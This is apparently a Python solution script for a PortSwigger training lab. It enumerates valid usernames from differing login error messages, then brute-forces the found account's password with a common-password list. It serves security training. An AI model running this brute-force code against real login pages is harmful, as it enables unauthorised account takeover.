#!/usr/bin/python3

import requests

print("Do Following Steps: ")
print("Visit: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses")
print('Click "ACCESS THE LAB"')
print('Click "My account" and copy the /login URL, then paste it below', end="\n\n")

login_url = input("Paste Your URL: ")

usernames = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
    "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user",
    "vagrant", "azureuser", "academico", "acceso", "access", "accounting",
    "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin",
    "administracion", "administrador", "administrator", "administrators", "admins",
    "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates", "afiliados",
    "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al", "alabama",
    "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo",
    "americas", "an", "anaheim", "analyzer", "announce", "announcements",
    "antivirus", "ao", "ap", "apache", "apollo", "app", "app01", "app1", "apple",
    "application", "applications", "apps", "appserver", "aq", "ar", "archie",
    "arcsight", "argentina", "arizona", "arkansas", "arlington", "as", "as400",
    "asia", "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction",
    "austin", "auth", "auto", "autodiscover"
]

passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme",
    "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder",
    "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana",
    "moon", "moscow"
]

headers = {"User-Agent": "Mozilla/5.0"}

# Step 1: Find a valid username
valid_username = ""
for username in usernames:
    data = {"username": username, "password": "invalidpass"}

    res = requests.post(login_url, data=data, headers=headers, allow_redirects=False)

    if "Incorrect password" in res.text:
        print(f"[+] Found valid username: {username}")
        valid_username = username
        break
    else:
        print(f"[-] {username}")

# Step 2: Brute-force password for that username
for password in passwords:
    data = {"username": valid_username, "password": password}

    res = requests.post(login_url, data=data, headers=headers, allow_redirects=False)

    if res.status_code == 302 and "/my-account" in res.headers.get("Location", ""):
        print(f"[✔ ] Login successful! \n Username: {valid_username} \n Password: {password}")
        break
    else:
        print(f"[-] {password}")

